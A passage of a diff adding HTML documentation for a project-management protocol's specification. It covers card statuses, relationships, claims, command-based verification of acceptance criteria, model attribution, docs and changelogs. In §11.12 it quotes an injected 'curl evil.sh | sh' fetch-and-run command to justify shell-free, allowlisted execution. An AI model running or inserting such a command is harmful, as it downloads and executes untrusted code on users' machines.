+<h3 id="113-statuses"><a class="hash" href="#113-statuses" aria-hidden="true" tabindex="-1">###</a> 11.3 Statuses</h3>
+<div class="table"><table>
+<thead>
+<tr>
+<th>Status</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>backlog</code></td>
+<td>Identified with no commitment on when.</td>
+</tr>
+<tr>
+<td><code>next</code></td>
+<td>Explicitly prioritized for the upcoming execution batch.</td>
+</tr>
+<tr>
+<td><code>doing</code></td>
+<td>Work is actively in progress.</td>
+</tr>
+<tr>
+<td><code>review</code></td>
+<td>Implementation is complete but awaits verification, deployment or sign-off.</td>
+</tr>
+<tr>
+<td><code>blocked</code></td>
+<td>Progress depends on an external condition; Notes explain it.</td>
+</tr>
+<tr>
+<td><code>deferred</code></td>
+<td>Deliberately postponed; Notes record the decision.</td>
+</tr>
+<tr>
+<td><code>done</code></td>
+<td>Finished and verified in an environment where the result runs.</td>
+</tr>
+<tr>
+<td><code>discarded</code></td>
+<td>Will not be done; Notes explain why.</td>
+</tr>
+</tbody></table></div>
+<p><code>done</code> does not mean merely committed or merged. User-visible changes remain <code>review</code> until
+verified in an appropriate running environment.</p>
+<h3 id="114-types"><a class="hash" href="#114-types" aria-hidden="true" tabindex="-1">###</a> 11.4 Types</h3>
+<div class="table"><table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>epic</code></td>
+<td>Grouping record for related executable work.</td>
+</tr>
+<tr>
+<td><code>idea</code></td>
+<td>Unvalidated proposal, hidden from execution views by default.</td>
+</tr>
+<tr>
+<td><code>feature</code></td>
+<td>Accepted product capability.</td>
+</tr>
+<tr>
+<td><code>bug</code></td>
+<td>Incorrect existing behavior.</td>
+</tr>
+<tr>
+<td><code>task</code></td>
+<td>General executable work.</td>
+</tr>
+<tr>
+<td><code>audit</code></td>
+<td>Investigation or verification work.</td>
+</tr>
+<tr>
+<td><code>docs</code></td>
+<td>Documentation work.</td>
+</tr>
+<tr>
+<td><code>chore</code></td>
+<td>Maintenance without direct product behavior.</td>
+</tr>
+</tbody></table></div>
+<h3 id="115-priority"><a class="hash" href="#115-priority" aria-hidden="true" tabindex="-1">###</a> 11.5 Priority</h3>
+<div class="table"><table>
+<thead>
+<tr>
+<th>Priority</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>critical</code></td>
+<td>Immediate material risk or production impact.</td>
+</tr>
+<tr>
+<td><code>high</code></td>
+<td>Important work that should be prioritized soon.</td>
+</tr>
+<tr>
+<td><code>medium</code></td>
+<td>Normal priority.</td>
+</tr>
+<tr>
+<td><code>low</code></td>
+<td>Valuable but safely postponed.</td>
+</tr>
+</tbody></table></div>
+<p>Priority MUST not encode workflow state or effort.</p>
+<h3 id="116-classification-axes"><a class="hash" href="#116-classification-axes" aria-hidden="true" tabindex="-1">###</a> 11.6 Classification axes</h3>
+<p><code>area</code> is one axis and it is shaped like a delivery layer. A project that also
+needs a domain axis — bounded contexts, products, customers — declares one under
+<code>cards.axes</code>:</p>
+<pre class="code" data-lang="js"><code>cards: {
+    areas: [&quot;api&quot;, &quot;web&quot;, &quot;infra&quot;],
+    axes: { context: [&quot;treasury&quot;, &quot;verifactu&quot;, &quot;billing&quot;, &quot;iam&quot;] }
+}</code></pre>
+<p>Each declared axis becomes a flat frontmatter key on the card:</p>
+<pre class="code" data-lang="yaml"><code>area: api
+context: treasury</code></pre>
+<p>Flat, not a nested <code>axes:</code> mapping, so the value stays greppable and the
+existing query grammar reads it without a second index: <code>search &quot;context:treasury&quot;</code> already filters on any frontmatter key.</p>
+<p>An axis is either its vocabulary, as above, or an object:</p>
+<pre class="code" data-lang="js"><code>axes: { goal: { values: [&quot;guards-server&quot;, &quot;fugas-cross-tenant&quot;], required: false } }</code></pre>
+<p>Rules:</p>
+<ul>
+<li>an axis name MUST NOT collide with a field a card already owns;</li>
+<li>an axis MUST declare a non-empty vocabulary;</li>
+<li>an axis declared as an array is required; <code>{ values, required: false }</code>
+declares the vocabulary without expecting a value on every open card;</li>
+<li>a card value outside the declared vocabulary is invalid, the way an unknown
+<code>area</code> is;</li>
+<li>an axis is optional on a card unless a project rule says otherwise;</li>
+<li>an <em>undeclared</em> frontmatter key remains legal and unvalidated — declaring an
+axis is what turns a free-text note into something that fails loudly.</li>
+</ul>
+<p>Health checks MUST report a card value outside the declared vocabulary as an
+error, whether or not the axis is required. A card carrying no value for a
+required axis SHOULD be a warning, and only while the work is open: declaring an
+axis on an existing repository must not produce one diagnostic per finished
+record. A card carrying no value for an axis declared <code>required: false</code> is not
+reported: the shape exists for boards whose resting state is not <code>done</code>, where
+the open-work exemption alone measured at three quarters of the doctor output.</p>
+<p>The schema surface reports the declared axes and which of them are optional, so
+an agent discovers them the way it discovers areas rather than by reading the
+config file.</p>
+<h3 id="117-hierarchy-and-relationships"><a class="hash" href="#117-hierarchy-and-relationships" aria-hidden="true" tabindex="-1">###</a> 11.7 Hierarchy and relationships</h3>
+<p>The default hierarchy is:</p>
+<pre class="code" data-lang="text"><code>epic → task → subtask</code></pre>
+<p>Rules:</p>
+<ul>
+<li>hierarchy is expressed only through <code>parent:</code>;</li>
+<li>files do not move when re-parented;</li>
+<li>maximum depth defaults to two levels below an epic;</li>
+<li>any non-epic card may have children when within the configured depth;</li>
+<li>hierarchy cycles are invalid;</li>
+<li>deleting a parent is forbidden while references remain;</li>
+<li><code>depends:</code> is an ordering hint, not a hard execution lock.</li>
+</ul>
+<p>A card carries five relationship fields, and they are not interchangeable:</p>
+<div class="table"><table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Holds</th>
+<th>Means</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>parent</code></td>
+<td>one card ID</td>
+<td>this card is <strong>part of</strong> that one</td>
+</tr>
+<tr>
+<td><code>depends</code></td>
+<td>card IDs</td>
+<td>those must close <strong>before</strong> this one is actionable</td>
+</tr>
+<tr>
+<td><code>origin</code></td>
+<td>record IDs, any kind</td>
+<td>this card was <strong>discovered while working on</strong> those</td>
+</tr>
+<tr>
+<td><code>raised</code></td>
+<td><code>reported</code> | <code>derived</code></td>
+<td>who put it on the board: a person asked, or an agent inferred it from the repository</td>
+</tr>
+<tr>
+<td><code>related</code></td>
+<td>record IDs, any kind</td>
+<td>worth reading alongside; no direction, no claim</td>
+</tr>
+<tr>
+<td><code>source</code></td>
+<td>a repository-relative path</td>
+<td>the file the work came from, checked on disk</td>
+</tr>
+</tbody></table></div>
+<p><code>origin</code> is provenance, not decomposition. A card found while working on another
+is not part of it — the origin is usually already closed, blocks nothing, and
+the reason it matters is the direction: it answers <em>where did this come from</em>,
+and read backwards, <em>what did that produce</em>. It accepts decisions and learnings
+as readily as cards, because a decision spawns work as often as a card does.</p>
+<p><code>origin</code> is declared, never inferred. Prose naming a record is a <code>mention</code> in
+the reference graph; an <code>origin</code> is a <code>reference</code>, and the two are not mixed.
+An origin that resolves to no record is reported by <code>doctor</code> as
+<code>missing-origin</code>, and a card naming itself as <code>self-origin</code>.</p>
+<p><code>agents context --card ID</code> reports both directions of it: <strong>Came out of</strong> for
+the card&#39;s own <code>origin</code>, <strong>Spawned</strong> for every card declaring this one.</p>
+<h3 id="118-claims-and-scope"><a class="hash" href="#118-claims-and-scope" aria-hidden="true" tabindex="-1">###</a> 11.8 Claims and scope</h3>
+<p>A claim is an advisory lease treated as binding by protocol-aware agents.</p>
+<p>Starting work performs one logical operation:</p>
+<pre class="code" data-lang="text"><code>status = doing
+claimed_by = current session or actor
+claimed_at = current timestamp
+scope = reviewed expected paths
+updated = today</code></pre>
+<p>Finishing, deferring, blocking or abandoning work clears the claim unless ownership remains
+explicitly justified by a configured workflow.</p>
+<p>Rules:</p>
+<ol>
+<li>Never work a card claimed by another active session.</li>
+<li>Compare <code>scope</code> with all other <code>doing</code> cards before claiming.</li>
+<li>Path overlap produces a coordination warning.</li>
+<li>Claims older than the configured lease may be broken with an explanatory Note.</li>
+<li>A card outside <code>doing</code> MUST NOT retain <code>claimed_by</code> or <code>claimed_at</code>.</li>
+<li>The CLI SHOULD provide atomic <code>claim</code>, <code>release</code> and <code>transition</code> operations.</li>
+</ol>
+<h3 id="119-scheduling"><a class="hash" href="#119-scheduling" aria-hidden="true" tabindex="-1">###</a> 11.9 Scheduling</h3>
+<p><code>start</code> and <code>due</code> are optional calendar dates used for planning views.</p>
+<ul>
+<li><code>due</code> must not precede <code>start</code>;</li>
+<li>either field may exist alone;</li>
+<li>dates do not change card status automatically;</li>
+<li>a future date on a completed card is not treated as lateness;</li>
+<li>scheduling is not a commitment unless another configured policy says so.</li>
+</ul>
+<h3 id="1110-assets"><a class="hash" href="#1110-assets" aria-hidden="true" tabindex="-1">###</a> 11.10 Assets</h3>
+<p>Assets are stored by card ID:</p>
+<pre class="code" data-lang="text"><code>.project/assets/T-0042/mockup.png</code></pre>
+<p>Rules:</p>
+<ul>
+<li>asset discovery is convention-based and not duplicated in frontmatter;</li>
+<li>filenames are sanitized;</li>
+<li>uploads are size-limited;</li>
+<li>path traversal is rejected;</li>
+<li>archiving a card does not move or break its assets;</li>
+<li>images may be rendered inline and other files offered as local links;</li>
+<li>Git suitability must be communicated before adding large binaries.</li>
+</ul>
+<h3 id="1111-archiving"><a class="hash" href="#1111-archiving" aria-hidden="true" tabindex="-1">###</a> 11.11 Archiving</h3>
+<ul>
+<li><code>done</code> and <code>discarded</code> cards may be moved to the configured archive directory.</li>
+<li>Archiving is explicit, never automatic.</li>
+<li>Archived IDs remain reserved.</li>
+<li>References to archived cards remain valid.</li>
+<li>Reopening restores a card to the live directory before transitioning it.</li>
+</ul>
+<h3 id="1112-card-declared-commands"><a class="hash" href="#1112-card-declared-commands" aria-hidden="true" tabindex="-1">###</a> 11.12 Card-declared commands</h3>
+<p>A card MAY bind an acceptance criterion to the command that proves it. The
+binding lives in frontmatter, as a <code>verify</code> block:</p>
+<pre class="code" data-lang="yaml"><code>verify:
+    - id: gate
+      run: [pnpm, test, test/acceptance.test.ts]
+      criteria: [sha256:ab12…]</code></pre>
+<p><code>run</code> MUST be an argument vector, and it MUST be executed without a shell. A
+single string is refused rather than split. The reason is that the allowlist
+below has to be decidable: over a shell line <code>pnpm test</code> is a prefix of
+<code>pnpm test; curl evil.sh | sh</code> as surely as it is a prefix of <code>pnpm test -w</code>,
+so a prefix matcher over a string would be predicting the behaviour of a parser
+it does not own. Over an argv executed with no shell there is no parser between
+the value that was matched and the vector the operating system receives, and
+prefix matching is element-wise string equality.</p>
+<p>An element MUST NOT be empty and MUST NOT hold a control character. This is a
+round-trip rule and not a shell-safety one: frontmatter is line-oriented, so an
+element carrying a newline would be stored as two lines and read back as
+something its author did not write, and a command that changes when it is
+stored cannot be matched against anything. Every other byte — <code>;</code>, <code>|</code>, <code>*</code>,
+spaces, non-ASCII — is permitted, because under a shell-free model it is one
+argument&#39;s data.</p>
+<p><strong>The commands a card may name are declared by the project</strong>, under
+<code>cards.verification.commands</code>, as a list of argv prefixes. The list is empty by
+default: a project that declares nothing can run nothing. A card naming a
+command outside it MUST be refused with a named error, and the refusal MUST
+happen in two places, because they cover different arrivals:</p>
+<ul>
+<li>on <strong>write</strong>, so a card authored through the protocol never lands and the
+refusal is a reviewable diff rather than a red build;</li>
+<li>on <strong>read</strong>, by the doctor, because a card is a Markdown file and one can
+arrive as a file in a diff — a fork&#39;s pull request — without ever calling a
+mutation. That case reaches no write path at all, so the doctor rule is the
+only gate it meets. It is an <code>error</code>, so the run that reports it fails.</li>
+</ul>
+<p>A declared prefix MUST be matched byte for byte, element by element. An
+implementation MUST NOT case-fold, trim, resolve paths, strip quotes, apply
+Unicode normalisation, or join the vector into a string and search it: each
+opens a gap between the command that was matched and the command that will run.
+A declared entry that could never match a stored command — an empty array,
+which is a prefix of everything, or an element the round trip would not return
+unchanged — MUST be refused when the configuration loads.</p>
+<p>The allowlist bounds which command a card may name. It does not bound what that
+command does, and MUST NOT be documented as though it did: every command worth
+allowing dispatches through a file the same pull request can edit. It is
+anti-escalation on a trusted branch and a way to keep a declared command
+reviewable in one place. Containment for an untrusted branch is a property of
+the job — no secrets, no write token, no evidence written back — not of the
+card.</p>
+<p><strong>Running them.</strong> <code>workfile card verify ID</code> executes each declared entry and
+reports pass or fail per entry. It is the only writer permitted to check a bound
+criterion: a criterion a <code>verify</code> entry names is refused to <code>card ac --check</code>,
+so without this command a card that binds its criteria is a card nothing can
+close. An entry MUST be permitted to write the criteria bound to it and no
+others — a runner that could check anything would be the same escalation one
+rung further in, reached by declaring an entry instead of by typing <code>--check</code>.
+Every entry the card declares MUST be checked against the allowlist before the
+first one is spawned, whether or not the caller selected it.</p>
+<p>A criterion&#39;s box records what a command decided, so only a command that reached
+a decision may write one:</p>
+<div class="table"><table>
+<thead>
+<tr>
+<th>Outcome</th>
+<th>Condition</th>
+<th>Bound criteria</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>passed</code></td>
+<td>Exit status <code>0</code>.</td>
+<td>Checked.</td>
+</tr>
+<tr>
+<td><code>failed</code></td>
+<td>Any other exit status.</td>
+<td>Unchecked.</td>
+</tr>
+<tr>
+<td><code>timed-out</code></td>
+<td>Killed at the configured timeout.</td>
+<td>Unchanged.</td>
+</tr>
+<tr>
+<td><code>errored</code></td>
+<td>No process started.</td>
+<td>Unchanged.</td>
+</tr>
+</tbody></table></div>
+<p>A failing run unchecking what a passing one checked is the honest reading: a
+proof that no longer reproduces is not a proof, and leaving the box would let
+<code>done</code> pass on it. The last two rows are not a weaker <code>failed</code> and MUST NOT be
+treated as one. Killing a command at the timeout is the implementation giving
+up, and a machine that cannot start the command has decided even less; neither
+is a fact about the criterion, and unchecking on either would let a run on the
+wrong machine erase a proof a right one produced — which no caller could undo,
+the criterion being machine-owned. All four are reported, and any outcome other
+than <code>passed</code> MUST fail the run.</p>
+<p>A run that changes a criterion&#39;s state MUST leave a trail entry naming the entry
+that changed it, in the same write as the change. A state change with no actor
+behind it is precisely what §11.2&#39;s trail exists to prevent, and a box that
+moved because a subprocess exited has no author in the record otherwise. A run
+that changes nothing records nothing, by the same rule as a repeated transition.</p>
+<p>The commands MUST run outside the card&#39;s write lock, and the bindings MUST be
+resolved against a reading of the card taken after the last command exits: the
+interval is minutes long, and a criterion reworded inside it is no longer bound
+to the entry, so the write is refused by name rather than applied to whatever
+line moved into that position.</p>
+<p>A command MUST be given a bounded time to run — <code>cards.verification.timeoutSeconds</code>,
+ten minutes by default — and an implementation MUST NOT offer a way to disable
+it. The caller most likely to meet a command that never exits is an unattended
+job, which has no keyboard to interrupt it with.</p>
+<p>There is no dry run. The flag previews filesystem changes, and a run that spawns
+every declared command and then skips the write-back has already done the part
+worth previewing; it MUST be refused rather than reinterpreted.</p>
+<h3 id="1113-how-done-was-proved"><a class="hash" href="#1113-how-done-was-proved" aria-hidden="true" tabindex="-1">###</a> 11.13 How <code>done</code> was proved</h3>
+<p>Reaching <code>done</code> MUST write a <code>verified</code> block, and leaving <code>done</code> MUST clear
+it. It is written by the protocol on every path into the status — transition,
+patch, release and bulk, from every surface — and it is not patchable: no
+caller can hand-write it, and an axis cannot be declared with that name.</p>
+<pre class="code" data-lang="yaml"><code>verified:
+    at: &quot;2026-08-05T10:12:00.000Z&quot;
+    method: ci
+    commit: 4b939fd2c1e07a0d5b6c8e93f1a2d4c7b8e05f36
+    run: &quot;https://ci.example/runs/1284&quot;
+    digest: &quot;sha256:1f0c…&quot;</code></pre>
+<p><code>method</code> is one of <code>local</code>, <code>ci</code>, <code>manual</code> or <code>forced</code>, and the tiers carry more
+of the substance here than the digest does.</p>
+<div class="table"><table>
+<thead>
+<tr>
+<th>Method</th>
+<th>Meaning</th>
+<th>Requires</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>local</code></td>
+<td>A command ran on the author&#39;s machine. Self-reported, and the default when no method is given.</td>
+<td>—</td>
+</tr>
+<tr>
+<td><code>ci</code></td>
+<td>A run anyone can open.</td>
+<td><code>run</code></td>
+</tr>
+<tr>
+<td><code>manual</code></td>
+<td>A person judged something no command expresses.</td>
+<td>prose evidence, and an actor</td>
+</tr>
+<tr>
+<td><code>forced</code></td>
+<td>The acceptance gate was walked past.</td>
+<td>—</td>
+</tr>
+</tbody></table></div>
+<p><code>forced</code> is <strong>derived, never supplied</strong>: it is written when, and only when,
+<code>assertAcceptanceMet</code> waived something, and a caller who asks for it MUST be
+refused. What was waived, and why, stays on the trail line described in §11.2 —
+recording the reason twice would create two places to disagree. A method
+supplied on a write that does not move the card into <code>done</code> MUST be refused
+rather than dropped, and so must a second method on a card that is already
+<code>done</code>: a close records the verification once, and a re-run of the command must
+not silently replace <code>ci</code> with <code>local</code>.</p>
+<p><code>manual</code> evidence is prose, so it goes in the body, as one line under
+<code>## Notes</code> — <code>- 2026-08-05 10:12Z alvaro — manual verification: TEXT</code>. The
+frontmatter codec holds one scalar per line, so anything longer could not live
+there without being mangled.</p>
+<p><code>commit</code> is HEAD at the moment of the close, and it is omitted when there is
+nothing to record. Git is optional: a workspace that is not a repository, a
+repository with no commits, and a machine with no git all close cards normally
+and simply carry no commit.</p>
+<p><strong>The digest covers the criteria region and the <code>verify</code> block, and nothing
+else.</strong> It cannot cover the body, because the same transition appends a trail
+entry — a whole-body digest would be invalidated by the write that created it.
+It is taken over a canonical reading rather than over raw text: the criteria as
+normalised text, sorted, plus the <code>verify</code> entries with their criteria sorted.
+Reordering criteria, checking a box, reflowing a paragraph and rewriting prose
+outside the region therefore leave it alone; editing what a criterion <em>says</em>
+does not.</p>
+<p>Staleness is reported and never enforced retroactively. <code>doctor</code> reports, as
+warnings:</p>
+<ul>
+<li><code>verified-criteria-changed</code> — the card is verified against criteria text that
+has since changed;</li>
+<li><code>verified-commit-unreachable</code> — a live <code>done</code> card&#39;s <code>commit</code> is not an
+ancestor of HEAD, so the branch that proved it may have been rebased away or
+never merged. Silent when git is absent, when the workspace is not a
+repository, when the clone is shallow, and when the object is not present:
+those are refusals to answer, not findings;</li>
+<li><code>verified-block-invalid</code> — the block does not read as a verification. Nothing
+in the protocol can write one, so it means a hand edit or a card that arrived
+as a file in a diff. Worth reporting because a block the codec cannot read
+makes the card unwritable in both directions: it can be neither rewritten nor
+cleared, so reopening it fails too.</li>
+</ul>
+<p>A <code>done</code> card carrying no block at all is deliberately <strong>not</strong> reported. Every
+card closed before this existed has none, and a warning per historical card is
+how doctor output stops being read.</p>
+<h3 id="1114-which-methods-an-area-accepts"><a class="hash" href="#1114-which-methods-an-area-accepts" aria-hidden="true" tabindex="-1">###</a> 11.14 Which methods an area accepts</h3>
+<p>A project MAY declare, per area, which of the methods above it accepts at
+<code>done</code>, under <code>cards.verification.methods</code>:</p>
+<pre class="code" data-lang="js"><code>cards: {
+    areas: [&quot;api&quot;, &quot;web&quot;, &quot;docs&quot;],
+    verification: {
+        methods: { api: [&quot;ci&quot;], docs: [&quot;ci&quot;, &quot;manual&quot;], &quot;*&quot;: [&quot;ci&quot;, &quot;local&quot;] }
+    }
+}</code></pre>
+<p><code>*</code> answers for every area the map does not name, including areas added after
+the policy was written. A project that declares nothing accepts every method,
+which is the behaviour of every workspace written before this key existed, and
+an implementation MUST treat &quot;declares nothing&quot; and &quot;declares the whole
+vocabulary&quot; as distinguishable: the first has no opinion and the second is a
+policy somebody wrote.</p>
+<p>A write that would move a card into <code>done</code> with a method the card&#39;s area does
+not accept MUST be refused with a named error, from every surface, and the
+refusal MUST name the accepted methods. <strong>A caller that names no method is
+judged, not exempt</strong>: §11.13 resolves an unnamed method to <code>local</code>, so under
+<code>{ api: [&quot;ci&quot;] }</code> a bare close of an <code>api</code> card is refused. The permissive
+reading — no method recorded, therefore nothing to check — would make the gate
+escapable by typing less.</p>
+<p>The gate is waivable, like the other two gates a close meets. <code>--force</code> with a
+reason gets past it, the trail line names the area&#39;s verification policy among
+what was waived, and the block then records <code>forced</code> rather than the method that
+was refused — which is why a forced close MUST NOT also name a method. A policy
+MUST NOT name <code>forced</code> itself: it is not a method a caller chose, and a project
+declaring it would be accepting a bypass as proof.</p>
+<p>The methods a policy names MUST be validated when the configuration loads. The
+<em>areas</em> it names MUST NOT be: an area may be removed from <code>cards.areas</code> while
+the policy still names it, and a configuration that refuses to load takes every
+command in the repository with it — including the doctor that would have
+explained why. It is reported instead, as <code>verification-policy-area-unknown</code>,
+beside the equivalent finding for a <code>search.provider</code> that resolves to nothing.</p>
+<p>Policy is not applied retroactively. A card already <code>done</code> whose recorded method
+the current policy no longer accepts is reported as the warning
+<code>verification-method-unaccepted</code> and never re-gated: tightening a policy must
+not invalidate closed work, and there is nothing to do about a shipped card
+except decide it is acceptable, which is what the doctor baseline is for.</p>
+<h3 id="1115-what-produced-a-write"><a class="hash" href="#1115-what-produced-a-write" aria-hidden="true" tabindex="-1">###</a> 11.15 What produced a write</h3>
+<p>The trail records an actor — which human, which session — and nothing about
+what did the work. A writer MAY declare what produced its writes, and when it
+does the protocol records it in two places: on the trail line as a second token
+after the actor, <code>via:MODEL/REASONING</code>, and in frontmatter as <code>produced_by</code>.</p>
+<pre class="code" data-lang="yaml"><code>produced_by:
+    model: claude-opus-4-1
+    reasoning: high
+    basis: self-reported</code></pre>
+<p>Rules:</p>
+<ol>
+<li><strong>Beside the actor, never inside it.</strong> <code>claimed_by</code> and the actor segment
+of a trail line are unchanged by a declared producer. Every comparison of
+actors — the claim guard, <code>claimSeparation</code>, the edit hook — reads the same
+string it read before.</li>
+<li><strong>Self-reported, and the record says so.</strong> The declaration comes from the
+writer&#39;s environment (<code>WORKFILE_MODEL</code>, <code>WORKFILE_REASONING</code>, the host&#39;s own
+effort variable, or what the host&#39;s hook copied into the session file), and
+an agent can set an environment variable to anything. Every block carries
+<code>basis: self-reported</code> and MUST NOT be read as attested.</li>
+<li><strong>Both halves, or the absence stated.</strong> <code>model</code> and <code>reasoning</code> are each a
+label or the word <code>undeclared</code>; the trail token drops an undeclared
+reasoning and keeps an undeclared model, so the line still says a producer
+was declared and what was not.</li>
+<li><strong>A label, not a payload.</strong> A declared value is at most 64 characters of
+<code>[A-Za-z0-9._:+-]</code>. Anything else is refused and reported to the caller,
+never written. This is what keeps the field from carrying a prompt, a key
+or a path into a committed record.</li>
+<li><strong>Last declared writer, plus history.</strong> The frontmatter block holds the
+newest writer <em>that declared a producer</em>, so it can be counted over without
+parsing prose; the trail keeps every earlier one. A write that declares
+nothing puts no token on its line and leaves the block as it was — the
+line without a token is the record of that write, and a human&#39;s note after
+an agent&#39;s close does not erase which model closed it. The block is not
+patchable and cannot be declared as an axis.</li>
+<li><strong>Nothing declared, nothing written.</strong> A workspace where no writer declares
+a producer produces records byte-identical to those of a protocol without
+this section. A writer that declared something the record refused is not
+that case: its write records <code>undeclared</code> on both halves, because it said
+it was something.</li>
+</ol>
+<p><code>doctor</code> reports <code>produced-by-invalid</code>, a warning, for a block that does not
+read as a producer: the protocol cannot write one, so it is a hand edit.</p>
+<h2 id="12-module-documentation"><a class="hash" href="#12-module-documentation" aria-hidden="true" tabindex="-1">##</a> 12. Module: Documentation</h2>
+<h3 id="121-purpose"><a class="hash" href="#121-purpose" aria-hidden="true" tabindex="-1">###</a> 12.1 Purpose</h3>
+<p>The Docs module provides one navigable and searchable view over project documentation without
+requiring a disruptive migration of existing files.</p>
+<p>It distinguishes:</p>
+<ol>
+<li><strong>Indexed documents</strong> — existing files owned by the project structure.</li>
+<li><strong>Managed documents</strong> — records created under the protocol with structured metadata.</li>
+</ol>
+<h3 id="122-indexed-documents"><a class="hash" href="#122-indexed-documents" aria-hidden="true" tabindex="-1">###</a> 12.2 Indexed documents</h3>
+<p>Configured glob patterns discover documents such as:</p>
+<pre class="code" data-lang="text"><code>README.md
+docs/**/*.md
+apps/*/README.md
+packages/*/docs/**/*.md</code></pre>
+<p>Indexed documents:</p>
+<ul>
+<li>remain at their original path;</li>
+<li>are read-only by default in the protocol UI;</li>
+<li>may be opened in the configured editor;</li>
+<li>may participate in search, backlinks and freshness checks;</li>
+<li>do not require protocol frontmatter;</li>
+<li>receive a derived identity based on path unless explicitly assigned a managed ID.</li>
+</ul>
+<p>An indexed tree that is published as a site may declare itself with
+<code>docs.routeRoots</code>. Inside such a root, a link target is a <strong>route</strong> rather than
+a path: it resolves from the root itself rather than from the linking file, and
+onto whichever file backs the route — <code>.md</code>, <code>.mdx</code>, or an <code>index</code> of either.
+Without it, a documentation site whose house style is <code>[text](section/page)</code> has
+every link reported as broken, and any genuinely dead one is lost in the noise.</p>
+<p><code>routeRoots</code> only ever widens what resolves. The file-relative reading is still
+tried, and outside a declared root a link is a path.</p>
+<h3 id="123-managed-documents"><a class="hash" href="#123-managed-documents" aria-hidden="true" tabindex="-1">###</a> 12.3 Managed documents</h3>
+<p>Managed documents live under <code>.project/docs/</code> or another configured path.</p>
+<pre class="code" data-lang="yaml"><code>---
+id: DOC-0012
+title: Billing architecture
+kind: architecture
+status: current
+owners: [billing]
+related: [T-0042, ADR-0008]
+created: 2026-07-20
+updated: 2026-07-28
+---
+
+Long-form documentation body.</code></pre>
+<p>Default document kinds:</p>
+<ul>
+<li><code>architecture</code></li>
+<li><code>product</code></li>
+<li><code>runbook</code></li>
+<li><code>guide</code></li>
+<li><code>reference</code></li>
+<li><code>research</code></li>
+<li><code>spec</code></li>
+<li><code>handoff</code></li>
+</ul>
+<p>Default statuses:</p>
+<ul>
+<li><code>draft</code></li>
+<li><code>current</code></li>
+<li><code>stale</code></li>
+<li><code>superseded</code></li>
+<li><code>archived</code></li>
+</ul>
+<p>Projects MAY add namespaced kinds.</p>
+<p>Managed documents MAY live in folders below the managed path. Implementations
+MUST load them recursively, so a folder created by hand is a valid organization
+with no protocol change, and MUST keep the identifier global and sequential: two
+documents MUST NOT share an ID even in different folders. Folders are
+organization, never identity, so moving a document MUST NOT change its ID.</p>
+<p><code>docs.layout</code> selects where new managed documents are written:</p>
+<ul>
+<li><code>kind</code> (default) — a folder named after the document kind;</li>
+<li><code>flat</code> — the managed root.</li>
+</ul>
+<p>An explicit folder (<code>--folder</code>, or <code>folder</code> in the API) MUST override the layout
+and MUST be rejected when it resolves outside the managed path.</p>
+<h3 id="124-relationships"><a class="hash" href="#124-relationships" aria-hidden="true" tabindex="-1">###</a> 12.4 Relationships</h3>
+<p>Docs may reference:</p>
+<ul>
+<li>cards that implement or maintain them;</li>
+<li>decisions that justify them;</li>
+<li>incidents that changed procedures;</li>
+<li>other documents they supersede;</li>
+<li>source-code paths they describe.</li>
+</ul>
+<p>The UI SHOULD show incoming and outgoing links.</p>
+<h3 id="125-freshness"><a class="hash" href="#125-freshness" aria-hidden="true" tabindex="-1">###</a> 12.5 Freshness</h3>
+<p>The protocol MUST distinguish objective checks from heuristic checks.</p>
+<p>Objective examples:</p>
+<ul>
+<li>referenced path no longer exists;</li>
+<li>related managed record ID is invalid;</li>
+<li>document declares <code>supersedes</code> but target is missing.</li>
+</ul>
+<p>Heuristic examples:</p>
+<ul>
+<li>source paths changed after the document&#39;s <code>updated</code> date;</li>
+<li>related cards completed after the document was last reviewed;</li>
+<li>configured review interval expired.</li>
+</ul>
+<p>Heuristic freshness issues are warnings, never automatic rewrites.</p>
+<h3 id="126-documentation-mutations"><a class="hash" href="#126-documentation-mutations" aria-hidden="true" tabindex="-1">###</a> 12.6 Documentation mutations</h3>
+<p>The MVP UI MAY keep documents read-only. The core and CLI MUST nevertheless expose safe
+create and update functions for managed documents so future editors and agents do not bypass
+validation.</p>
+<h2 id="13-module-changelog-and-releases"><a class="hash" href="#13-module-changelog-and-releases" aria-hidden="true" tabindex="-1">##</a> 13. Module: Changelog and releases</h2>
+<h3 id="131-purpose"><a class="hash" href="#131-purpose" aria-hidden="true" tabindex="-1">###</a> 13.1 Purpose</h3>
+<p>The changelog module records user-meaningful and operator-meaningful changes as atomic
+fragments, then composes them into releases and optional generated files.</p>
+<p>Git commits remain implementation history. Changelog records describe the meaning of change.</p>
+<h3 id="132-change-fragment-format"><a class="hash" href="#132-change-fragment-format" aria-hidden="true" tabindex="-1">###</a> 13.2 Change fragment format</h3>
+<pre class="code" data-lang="yaml"><code>---
+id: CHG-0091
+title: Prevent duplicate invoice submissions
+type: fixed
+area: billing
+visibility: public
+cards: [T-0042]
+issues: []
+created: 2026-07-28
+updated: 2026-07-28
+---
+
+Network retries now reuse the original invoice instead of creating another one.</code></pre>
+<p>Default types:</p>
+<ul>
+<li><code>added</code></li>
+<li><code>changed</code></li>
+<li><code>fixed</code></li>
+<li><code>deprecated</code></li>
+<li><code>removed</code></li>
+<li><code>security</code></li>
+<li><code>internal</code></li>
+</ul>
+<p>Visibility:</p>
+<ul>
+<li><code>public</code></li>
+<li><code>internal</code></li>
+</ul>
+<h3 id="133-unreleased-fragments"><a class="hash" href="#133-unreleased-fragments" aria-hidden="true" tabindex="-1">###</a> 13.3 Unreleased fragments</h3>
+<p>Fragments are created under:</p>
+<pre class="code" data-lang="text"><code>.project/changelog/unreleased/</code></pre>
+<p>They SHOULD be created in the same change set as the implementation when the result is worth
+communicating. Trivial internal changes may omit them according to project policy.</p>
+<h3 id="134-releases"><a class="hash" href="#134-releases" aria-hidden="true" tabindex="-1">###</a> 13.4 Releases</h3>
+<p>A release operation:</p>
+<ol>
+<li>selects unreleased fragments;</li>
+<li>validates their references;</li>
+<li>orders and groups them deterministically;</li>
+<li>writes a release record;</li>
+<li>optionally updates a generated <code>CHANGELOG.md</code>;</li>
+<li>moves or marks consumed fragments without losing their IDs;</li>
+<li>records the release version and date.</li>
+</ol>
+<p>Release record example:</p>
+<pre class="code" data-lang="yaml"><code>---
+id: REL-0017
+title: Version 2.4.0
+version: 2.4.0
+date: 2026-07-28
